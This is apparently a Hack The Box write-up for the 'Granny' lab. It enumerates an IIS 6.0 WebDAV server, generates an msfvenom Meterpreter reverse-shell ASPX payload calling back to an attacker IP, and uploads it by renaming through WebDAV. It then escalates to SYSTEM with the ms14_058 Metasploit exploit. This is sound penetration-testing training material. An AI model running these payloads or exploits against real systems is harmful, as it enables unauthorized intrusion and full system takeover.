---
title: Hack The Box - Granny
date: 2022-01-6 08:10:00
categories: [hackthebox]
tags: [windows]
math: true
mermaid: true
toc: true
comments: true
---
## RECON
### NMAP

Starting with `nmap`, nmap shows only port `80(http)`  is open.
- Port 80 : Microsoft IIS httpd 6.0

```bash
┌─[root@linux]─[/home/htb/windows_box/granny] 
└──╼ #nmap -sT -p- --min-rate 10000 -oA granny-alltcp.htb 10.10.10.15 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 14:32 +0545 
Nmap scan report for 10.10.10.15 
Host is up (0.077s latency). 
Not shown: 65534 filtered tcp ports (no-response) 
PORT   STATE SERVICE 
80/tcp open  http 
Nmap done: 1 IP address (1 host up) scanned in 43.54 seconds

┌─[root@linux]─[/home/htb/windows_box/granny] 
└──╼ #nmap -p 80 -sC -sV 10.10.10.15 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 14:34 +0545 
Nmap scan report for 10.10.10.15 
Host is up (0.072s latency). 
PORT   STATE SERVICE VERSION 
80/tcp open  http    Microsoft IIS httpd 6.0 
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT 
|_http-title: Error 
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK 
|   Server Type: Microsoft-IIS/6.0 
|   WebDAV type: Unknown 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
|_  Server Date: Wed, 04 Jan 2023 08:49:15 GMT 
|_http-server-header: Microsoft-IIS/6.0 
| http-ntlm-info: 
|   Target_Name: GRANNY 
|   NetBIOS_Domain_Name: GRANNY 
|   NetBIOS_Computer_Name: GRANNY 
|   DNS_Domain_Name: granny 
|   DNS_Computer_Name: granny 
|_  Product_Version: 5.2.3790 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 9.51 seconds
```


### WEB PORT - 80

Site shows it's under construction.


### Headers:

```bash
┌─[root@linux]─[/home/htb/windows_box/granny] 
└──╼ #curl -I 10.10.10.15 
HTTP/1.1 500 Internal Server Error 
Content-Length: 69 
Content-Type: text/html 
Server: Microsoft-IIS/6.0 
MicrosoftOfficeWebServer: 5.0_Pub 
X-Powered-By: ASP.NET 
Date: Wed, 04 Jan 2023 08:53:49 GMT
```

`X-Powered-By: ASP.NET`  header tells us that we may execute asp files if we can upload it.

### Gobuster

```bash
┌─[✗]─[root@linux]─[/home/htb/windows_box/granny] 
└──╼ #gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u  http://10.10.10.15 -t 50 -x aspx,txt,html 
=============================================================== 
Gobuster v3.1.0 
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) 
=============================================================== 
[+] Url:                     http://10.10.10.15 
[+] Method:                  GET 
[+] Threads:                 50 
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
[+] Negative Status codes:   404 
[+] User Agent:              gobuster/3.1.0 
[+] Extensions:              aspx,txt,html 
[+] Timeout:                 10s 
=============================================================== 
2023/01/04 15:18:48 Starting gobuster in directory enumeration mode 
=============================================================== 
/images               (Status: 301) [Size: 149] [--> http://10.10.10.15/images/] 
/Images               (Status: 301) [Size: 149] [--> http://10.10.10.15/Images/] 
/IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.15/IMAGES/]
/_private             (Status: 301)
```
Both /images  and /_private  are empty dirs.

### WebDAV

Above nmap scan shows that webdav methods such as PUT, MOVE are enabled and we can use to upload files.


### davtest

We'll use davtest  to explore further, and it will show us what types of files can be uploaded, and if it can create a directory:

```bash
┌─[root@linux]─[/home/htb/windows_box/granny] 
└──╼ #davtest -url http://10.10.10.15 
******************************************************** 
 Testing DAV connection 
OPEN            SUCCEED:                http://10.10.10.15 
******************************************************** 
NOTE    Random string for this session: MOlGJTu00N6p6 
******************************************************** 
 Creating directory 
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_MOlGJTu00N6p6 
******************************************************** 
 Sending test files 
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.cfm 
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jsp 
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.php 
PUT     asp     FAIL 
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.pl 
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt 
PUT     cgi     FAIL 
PUT     aspx    FAIL 
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jhtml 
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.html 
PUT     shtml   FAIL 
******************************************************** 
 Checking for test file execution 
EXEC    cfm     FAIL 
EXEC    jsp     FAIL 
EXEC    php     FAIL 
EXEC    pl      FAIL 
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt 
EXEC    jhtml   FAIL 
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.html 
******************************************************** 
/usr/bin/davtest Summary: 
Created: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6 
PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.cfm 
PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jsp 
PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.php 
PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.pl 
PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt 
PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jhtml 
PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.html 
Executes: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt 
Executes: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.html
```
We can upload alotof file types but not aspx, which is what we want.


## SHELL AS NETWORK SERVICE

### Meterpreter

Creating a windows meterpreter reverse shell.

```bash
┌─[root@linux]─[/home/htb/windows_box/granny]
└──╼ #msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.22 lport=4444 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2886 bytes
```

Since  davtest suggested we cannot upload aspx  directly so first we have to rename shell.aspx  as shell.txt  then rename it later as shell.aspx  once uploaded.

mv shell.aspx shell.txt


### cadaver

We'll use cadvaer  tool to upload files to the server.

```bash
┌─[✗]─[root@linux]─[/home/htb/windows_box/granny] 
└──╼ #cadaver -t 10.10.10.15 
dav:/> put shell.txt 
Uploading shell.txt to `/shell.txt': 
Progress: [=============================>] 100.0% of 2886 bytes succeeded. 
dav:/> mv shell.txt shell.aspx 
Moving `/shell.txt' to `/shell.aspx':  succeeded. 
dav:/> ls 
Listing collection `/': succeeded. 
Coll:   DavTestDir_MOlGJTu00N6p6               0  Jan  4 14:52 
Coll:   _private                               0  Apr 12  2017 
Coll:   _vti_bin                               0  Apr 12  2017 
Coll:   _vti_cnf                               0  Apr 12  2017 
Coll:   _vti_log                               0  Apr 12  2017 
Coll:   _vti_pvt                               0  Apr 12  2017 
Coll:   _vti_script                            0  Apr 12  2017 
Coll:   _vti_txt                               0  Apr 12  2017 
Coll:   aspnet_client                          0  Apr 12  2017 
Coll:   images                                 0  Apr 12  2017 
        _vti_inf.html                       1754  Apr 12  2017 
        iisstart.htm                        1433  Feb 21  2003 
        pagerror.gif                        2806  Feb 21  2003 
        postinfo.html                       2440  Apr 12  2017 
        shell.aspx                          2886  Jan  4 15:33 
dav:/>
```

Here, we have uploaded shell.txt  using the PUT  method which was successful and then renamed to shell.aspx  using the MOVE  method. 

start metasploit multi handler.
```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) > show options 
Module options (exploit/multi/handler): 
   Name  Current Setting  Required  Description 
   ----  ---------------  --------  ----------- 
Payload options (windows/meterpreter/reverse_tcp): 
   Name      Current Setting  Required  Description 
   ----      ---------------  --------  ----------- 
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none) 
   LHOST     10.10.14.22      yes       The listen address (an interface may be specified) 
   LPORT     4444             yes       The listen port 
Exploit target: 
   Id  Name 
   --  ---- 
   0   Wildcard Target 
msf6 exploit(multi/handler) > run 
[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] Sending stage (175174 bytes) to 10.10.10.15 
[*] Meterpreter session 1 opened (10.10.14.22:4444 -> 10.10.10.15:1104) at 2023-01-04 21:01:37 +0545 

meterpreter > shell 
Process 3388 created. 
Channel 1 created. 
Microsoft Windows [Version 5.2.3790] 
(C) Copyright 1985-2003 Microsoft Corp. 
c:\windows\system32\inetsrv>whoami 
whoami 
nt authority\network service
```


## SHELL AS SYSTEM

```bash
msf6 post(multi/recon/local_exploit_suggester) > run 
[*] 10.10.10.15 - Collecting local exploits for x86/windows... 
[*] 10.10.10.15 - 176 exploit checks are being tried... 
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. 
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. 
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. 
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. 
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. 
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. 
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. 
[*] Running check method for exploit 41 / 41 
[*] 10.10.10.15 - Valid modules for session 1:
```

### MS14_058
Description:
This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability can be triggered through the use of TrackPopupMenu. Under special conditions, the NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary code execution.
```bash
msf6 exploit(windows/local/ms14_058_track_popup_menu) > sessions -i 
Active sessions 
=============== 
  Id  Name  Type                     Information                            Connection 
  --  ----  ----                     -----------                            ---------- 
  1         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ GRANNY  10.10.14.22:4444 -> 10.10.10.15:1049 (10.10.10.15) 
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set session 1 
session => 1 
msf6 exploit(windows/local/ms14_058_track_popup_menu) > run 
[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] Reflectively injecting the exploit DLL and triggering the exploit... 
[*] Launching netsh to host the DLL... 
[+] Process 3208 launched. 
[*] Reflectively injecting the DLL into 3208... 
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete. 
[*] Sending stage (175686 bytes) to 10.10.10.15 
[*] Meterpreter session 2 opened (10.10.14.22:4444 -> 10.10.10.15:1050) at 2023-01-04 22:37:54 +0545 
meterpreter > shell 
Process 3308 created. 
Channel 1 created. 
Microsoft Windows [Version 5.2.3790] 
(C) Copyright 1985-2003 Microsoft Corp. 
c:\windows\system32\inetsrv>whoami 
whoami 
nt authority\system
```



